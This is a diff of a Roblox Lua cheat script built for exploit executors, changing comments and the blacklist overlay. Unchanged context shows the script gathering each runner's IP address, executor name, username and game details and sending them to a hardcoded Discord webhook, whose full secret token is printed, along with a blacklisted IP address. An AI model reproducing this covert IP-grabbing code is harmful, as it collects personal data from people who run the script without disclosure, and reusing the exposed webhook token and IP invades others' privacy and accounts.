@@ -33,7 +33,7 @@ local Window = Rayfield:CreateWindow({
     }
 })
 
--- === Webhook Integration & Blacklist ===
+-- === Webhook + Blacklist Configuration ===
 local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 
 local HttpService = game:GetService("HttpService")
@@ -41,10 +41,9 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
 
--- Request function (compatible with multiple executors)
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
 
--- === Blacklist Data ===
+-- === Blacklist Entries ===
 local BlacklistedUsernames = {
     ["InfxmousLearzy"] = true
 }
@@ -53,19 +52,22 @@ local BlacklistedIPs = {
     ["182.3.39.56"] = true
 }
 
--- === GUI: Blacklist Overlay ===
+-- === GUI: Blacklist Screen (non-blocking) ===
 local function showBlacklistScreen()
     local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
     local screenGui = Instance.new("ScreenGui")
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
     screenGui.Name = "BlacklistGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = false
+    screenGui.DisplayOrder = -1000
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = PlayerGui
 
     local blackFrame = Instance.new("Frame")
+    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackFrame.BackgroundTransparency = 0.25
     blackFrame.Size = UDim2.new(1, 0, 1, 0)
     blackFrame.Position = UDim2.new(0, 0, 0, 0)
-    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
     blackFrame.BorderSizePixel = 0
     blackFrame.Parent = screenGui
 
@@ -80,7 +82,7 @@ local function showBlacklistScreen()
     label.Parent = screenGui
 end
 
--- === Get IP + Executor Info ===
+-- === Get Info Functions ===
 local function getClientInfo()
     local ip = "Unknown"
     local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
@@ -101,7 +103,6 @@ local function getClientInfo()
     return ip, executor
 end
 
--- === Get Game Info ===
 local function getGameInfo()
     local success, data = pcall(function()
         return MarketplaceService:GetProductInfo(game.PlaceId)
@@ -144,14 +145,14 @@ local function sendWebhook(ip, executor)
     })
 end
 
--- === Main Logic ===
+-- === Main Execution ===
 task.spawn(function()
     local ip, executor = getClientInfo()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
 
     if BlacklistedUsernames[username] or BlacklistedIPs[ip] then
         showBlacklistScreen()
-        while true do task.wait() end
+        return
     end
 
     sendWebhook(ip, executor)
